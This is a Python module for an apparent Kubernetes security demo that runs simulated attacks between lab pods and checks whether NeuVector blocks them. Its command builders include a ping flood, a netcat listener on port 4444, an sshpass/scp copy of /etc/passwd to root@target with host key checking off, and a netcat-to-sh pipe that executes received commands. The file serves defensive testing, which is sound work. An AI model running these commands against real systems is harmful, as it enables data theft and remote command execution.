"""Attack simulation demo - simulate various attack scenarios."""

import asyncio
from typing import Any, AsyncGenerator

from app.core.kubectl import Kubectl
from app.config import NAMESPACE
from app.demos.base import DemoModule, DemoParameter
from app.demos.registry import DemoRegistry


@DemoRegistry.register
class AttackSimulationDemo(DemoModule):
    """Demo to simulate attack scenarios (DoS, package install, file transfer, reverse shell)."""

    id = "attack"
    name = "Attack Simulation"
    description = ""
    category = "Security Testing"
    icon = "⚔️"

    @property
    def parameters(self) -> list[DemoParameter]:
        return [
            DemoParameter(
                name="pod_name",
                label="Source Pod",
                type="select",
                default="espion1",
                required=True,
                options=[
                    {"value": "espion1", "label": "Espion1"},
                    {"value": "cible1", "label": "Cible1"},
                ],
                help_text="Pod from which to run the attack simulation",
            ),
            DemoParameter(
                name="attack_type",
                label="Attack Type",
                type="select",
                default="dos_ping",
                required=True,
                options=[
                    {"value": "dos_ping", "label": "DoS Ping Flood (40KB)"},
                    {"value": "nc_backdoor", "label": "NC Backdoor (netcat listener)"},
                    {"value": "scp_transfer", "label": "File Transfer (scp)"},
                    {"value": "reverse_shell", "label": "Reverse Shell"},
                ],
                help_text="Type of attack to simulate",
            ),
            DemoParameter(
                name="target",
                label="Target",
                type="select",
                default="cible1",
                required=True,
                options=[
                    {"value": "cible1", "label": "Cible1"},
                    {"value": "external", "label": "External (example.com)"},
                ],
                help_text="Target of the attack",
            ),
        ]

    async def _resolve_target(self, kubectl: Kubectl, target: str) -> str:
        """Resolve the target address based on target selection."""
        if target == "cible1":
            # Get the pod IP for cible1
            try:
                stdout, stderr, returncode = await kubectl.run(
                    "get", "pod", "cible1",
                    "-o", "jsonpath={.status.podIP}",
                    namespace=NAMESPACE,
                    check=False,
                )
                pod_ip = stdout.strip()
                if pod_ip and returncode == 0:
                    return pod_ip
            except Exception:
                pass
            # Fallback to service DNS name
            return f"cible1.{NAMESPACE}.svc.cluster.local"
        else:
            # External target
            return "example.com"

    async def execute(
        self,
        kubectl: Kubectl,
        params: dict[str, Any],
    ) -> AsyncGenerator[str, None]:
        attack_type = params.get("attack_type", "dos_ping")
        pod_name = params.get("pod_name", "espion1")
        target = params.get("target", "cible1")

        # Get attack type label for display
        attack_labels = {
            "dos_ping": "DoS Ping Flood (40KB payload)",
            "nc_backdoor": "NC Backdoor (netcat listener)",
            "scp_transfer": "File Transfer (scp)",
            "reverse_shell": "Reverse Shell",
        }
        attack_label = attack_labels.get(attack_type, attack_type)

        yield f"[INFO] Starting attack simulation: {attack_label}"
        yield f"[INFO] Source pod: {pod_name}"
        yield f"[INFO] Target: {target}"
        yield ""

        # Resolve target address
        target_addr = await self._resolve_target(kubectl, target)
        yield f"[INFO] Resolved target address: {target_addr}"
        yield ""

        # Build command based on attack type
        if attack_type == "dos_ping":
            # DoS Ping Flood with 40KB payload
            cmd_args = ["ping", "-s", "40000", "-c", "5", target_addr]
            yield "[INFO] Simulating DoS attack with oversized ICMP packets (40KB payload)"
        elif attack_type == "nc_backdoor":
            # Netcat backdoor listener - will be blocked in Protect mode
            cmd_args = ["nc", "-l", "-w", "5", "4444"]
            yield "[INFO] Attempting to start netcat backdoor listener on port 4444 (5s timeout)"
        elif attack_type == "scp_transfer":
            # File transfer of sensitive data using sshpass for non-interactive auth
            cmd_args = ["sshpass", "-p", "demo123", "scp",
                       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                       "/etc/passwd", f"root@{target_addr}:/tmp/"]
            yield "[INFO] Attempting to transfer sensitive file (/etc/passwd)"
        elif attack_type == "reverse_shell":
            # Reverse shell: start listener on target, connect from source
            # When connection succeeds, execute hostname -f on target
            yield "[INFO] Step 1: Starting command listener on cible1:4444..."

            # Start listener on cible1 that will execute received commands
            # It listens, receives a command, executes it, and stores output
            listener_cmd = ["sh", "-c", "rm -f /tmp/shell_output; (nc -l -p 4444 -w 10 | sh > /tmp/shell_output 2>&1) & echo $!"]
            try:
                stdout, stderr, rc = await kubectl.run(
                    "exec", "cible1", "--", *listener_cmd,
                    namespace=NAMESPACE,
                    check=False,
                )
                if rc == 0:
                    yield f"[INFO] Listener started on cible1 (PID: {stdout.strip()})"
                else:
                    yield f"[WARNING] Failed to start listener: {stderr}"
            except Exception as e:
                yield f"[WARNING] Failed to start listener: {e}"

            # Small delay to ensure listener is ready
            await asyncio.sleep(1)

            yield "[INFO] Step 2: Sending remote command from espion1..."
            # Send hostname -f command to the listener
            # Note: nc may return exit code 1 after connection closes (normal)
            cmd_args = ["sh", "-c", f"echo 'hostname -f' | nc -w 3 {target_addr} 4444 || true"]
            yield "[INFO] Sending 'hostname -f' command to cible1 via netcat"
        else:
            yield f"[ERROR] Unknown attack type: {attack_type}"
            return

        yield f"[CMD] kubectl exec {pod_name} -n {NAMESPACE} -- {' '.join(cmd_args)}"
        yield ""

        # Execute command in pod and track if process was killed
        process_killed = False
        command_success = False
        permission_denied = False

        try:
            async for line in kubectl.exec_in_pod(
                pod_name=pod_name,
                command=cmd_args,
                namespace=NAMESPACE,
                timeout=30,
            ):
                yield line
                # Check for various blocking/error indicators
                lower_line = line.lower()
                # Only exit code 137 (SIGKILL) indicates NeuVector block
                if 'exit code 137' in lower_line:
                    process_killed = True
                if 'permission denied' in lower_line or 'operation not permitted' in lower_line:
                    permission_denied = True
                if 'not found' in lower_line or 'no such file' in lower_line:
                    permission_denied = True
                # Check for success indicators based on attack type
                if attack_type == "dos_ping":
                    if 'bytes from' in lower_line or 'time=' in lower_line:
                        command_success = True
                elif attack_type == "nc_backdoor":
                    if 'listening' in lower_line:
                        command_success = True
                elif attack_type == "scp_transfer":
                    if '100%' in line:
                        command_success = True
                elif attack_type == "reverse_shell":
                    # nc exits cleanly if connection was made
                    pass  # Check will be done after command
        except Exception as e:
            error_str = str(e).lower()
            # Exit code 137 = SIGKILL (NeuVector Protect mode)
            if 'exit code 137' in error_str:
                process_killed = True
            # Exit code 126/127 = permission denied or command not found
            elif 'exit code 126' in error_str or 'exit code 127' in error_str:
                permission_denied = True
            yield f"[ERROR] {str(e)}"

        yield ""

        # For reverse shell, check if command was executed on target
        if attack_type == "reverse_shell" and not process_killed and not permission_denied:
            await asyncio.sleep(2)  # Wait for command execution
            yield "[INFO] Step 3: Checking result on cible1..."
            try:
                stdout, stderr, rc = await kubectl.run(
                    "exec", "cible1", "--", "cat", "/tmp/shell_output",
                    namespace=NAMESPACE,
                    check=False,
                )
                if rc == 0 and stdout.strip():
                    yield f"[SUCCESS] Remote command executed! Hostname: {stdout.strip()}"
                    command_success = True
                else:
                    yield "[INFO] No output received (connection may have failed)"
            except Exception as e:
                yield f"[INFO] Could not verify result: {e}"

        yield ""

        # Report results
        if process_killed:
            yield f"[BLOCKED] Attack '{attack_label}' was blocked by NeuVector!"
            yield "[INFO] Process was killed (exit code 137 - SIGKILL)"
            yield "[INFO] This indicates the process profile is in Protect mode"
            raise Exception("Attack blocked by NeuVector")
        elif permission_denied:
            yield f"[BLOCKED] Attack '{attack_label}' failed - permission denied or command not found"
            yield "[INFO] This may indicate process profile blocking or missing binary"
            raise Exception("Attack blocked - permission denied")
        elif command_success:
            yield f"[WARNING] Attack '{attack_label}' succeeded!"
            yield "[INFO] Consider switching to Protect mode to block this attack"
        else:
            yield f"[INFO] Attack simulation '{attack_label}' completed"
            yield "[INFO] Check NeuVector Security Events for any violations detected"
